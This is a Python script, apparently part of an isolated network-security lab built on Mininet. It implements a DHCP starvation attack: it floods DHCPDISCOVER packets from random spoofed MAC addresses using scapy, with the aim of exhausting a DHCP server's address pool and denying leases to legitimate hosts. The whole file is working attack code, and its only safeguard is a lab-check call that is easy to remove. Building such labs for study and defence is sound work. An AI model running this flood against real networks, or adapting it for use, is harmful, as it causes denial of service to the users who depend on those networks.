"""DHCP 고갈 공격 (w11) — 격리 실험용.

공격자가 매번 다른 가짜 MAC으로 DHCPDISCOVER를 대량으로 보내서 정상 DHCP 서버의
주소 풀(IP 풀)을 소진시킵니다. 풀이 바닥나면 새로 접속하는 정상 호스트가
임대를 받지 못합니다(서비스 거부).

이 스크립트는 scapy로 DHCPDISCOVER만 보냅니다. OFFER를 받아도 REQUEST로
확정(임대 완료)하지 않습니다 — 그래도 서버가 각 DISCOVER에 임시로 주소를
묶어두므로(dnsmasq는 OFFER 시점에 주소를 예약) 풀 소진 효과가 납니다.

run.py가 Mininet 공격자 호스트 안에서 실행합니다. 직접 실행은 labguard가 막습니다.

    python env/attacks/dhcp_exhaust.py --iface h4-eth0 --rate 20 --duration 30
"""

from __future__ import annotations

import argparse
import random
import time

from env.attacks.labguard import require_lab


def random_mac() -> str:
    b = [0x02, random.randint(0, 255), random.randint(0, 255),
         random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)]
    return ":".join(f"{x:02x}" for x in b)


def run(iface: str, rate: float, duration: float) -> None:
    from scapy.all import (BOOTP, DHCP, IP, UDP, Ether, fuzz, sendp)  # noqa: F401

    interval = 1.0 / rate if rate > 0 else 0.0
    end = time.time() + duration
    sent = 0
    while time.time() < end:
        mac = random_mac()
        xid = random.randint(0, 0xFFFFFFFF)
        pkt = (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
            / IP(src="0.0.0.0", dst="255.255.255.255")
            / UDP(sport=68, dport=67)
            / BOOTP(chaddr=bytes.fromhex(mac.replace(":", "")), xid=xid, flags=0x8000)
            / DHCP(options=[("message-type", "discover"), "end"])
        )
        sendp(pkt, iface=iface, verbose=False)
        sent += 1
        if interval:
            time.sleep(interval)
    print(f"dhcp_exhaust 끝: {sent}개 DISCOVER 전송 (iface={iface})")


def main() -> None:
    require_lab()
    p = argparse.ArgumentParser(description="DHCP 고갈 공격 (격리 실험용)")
    p.add_argument("--iface", required=True)
    p.add_argument("--rate", type=float, default=20.0, help="초당 DISCOVER 수")
    p.add_argument("--duration", type=float, default=30.0)
    a = p.parse_args()
    run(a.iface, a.rate, a.duration)


if __name__ == "__main__":
    main()
